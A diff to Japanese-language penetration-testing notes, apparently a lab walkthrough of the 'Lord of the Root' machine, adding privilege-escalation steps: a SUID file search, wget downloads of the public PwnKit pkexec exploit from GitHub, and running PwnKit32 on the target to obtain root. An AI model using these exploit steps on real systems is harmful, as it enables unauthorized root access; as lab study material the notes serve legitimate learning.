@@ -52,10 +52,18 @@
 - `ss -lntp`
   - 動いているポートを探す。プロセスで動いているのはポートにも大体あるので、ここでも特に珍しいのはない 
 - SUID
+  - `find / -perm -u=s -type f 2>/dev/null`
   - PwnKit(バイナリコード)は64bitなので使えない
-  - pkexec.sh(シェルスクリプト)は32bitなので使える。追記2を使う。
+- pkexec.sh(シェルスクリプト)は32bitなので使える。追記2を使う。
   - Lord of the rootの`/tmp`にpkexec.shを置いて、実行する
-  
+
+- pkexec
+  - PwnKit -> バイナリの実行ファイル
+    - ここに一覧がある`https://github.com/ly4k/PwnKit`ここでは32bitと64bitの両方をParrotの`~/tools/`に落とす。
+    - `wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit`
+    - `wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit32`
+  - Parrotからコピーしてきて実行する
+  - `./PwnKit32`
 - root取得後
   - `#`になるので`bash -i`をすると、新しいプロセスでシェルを起動できる
   - ポートノッキングのファイルをチェックする
